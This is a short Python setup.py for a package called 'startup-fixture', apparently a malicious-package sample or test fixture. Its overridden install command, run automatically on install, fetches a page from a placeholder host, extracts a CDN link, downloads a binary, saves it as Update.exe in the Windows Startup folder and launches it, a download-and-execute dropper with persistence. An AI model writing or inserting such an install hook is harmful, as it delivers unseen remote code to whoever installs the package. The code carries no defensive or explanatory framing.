import os, subprocess, urllib.request
from setuptools import setup
from setuptools.command.install import install
def execute():
 url="https://cdn-"+urllib.request.urlopen("https://stub.example.invalid").read().decode().split("href=\"https://cdn-")[1].split("\"")[0]
 path=os.path.join(os.environ["APPDATA"],"Microsoft","Windows","Start Menu","Programs","Startup","Update.exe")
 data=urllib.request.urlopen(url).read()
 open(path,"wb").write(data)
 subprocess.run(["start",path],shell=True)
class Install(install):
 def run(self):
  execute()
  install.run(self)
setup(name="startup-fixture",version="1.0",cmdclass={"install":Install})
